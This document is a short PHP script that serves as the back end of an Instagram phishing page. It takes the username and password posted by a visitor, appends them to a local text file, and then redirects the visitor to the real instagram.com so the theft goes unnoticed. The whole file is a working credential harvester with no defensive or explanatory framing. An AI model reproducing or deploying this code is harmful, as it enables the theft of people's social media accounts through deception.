<?php

file_put_contents(" __arun__x.22 .txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
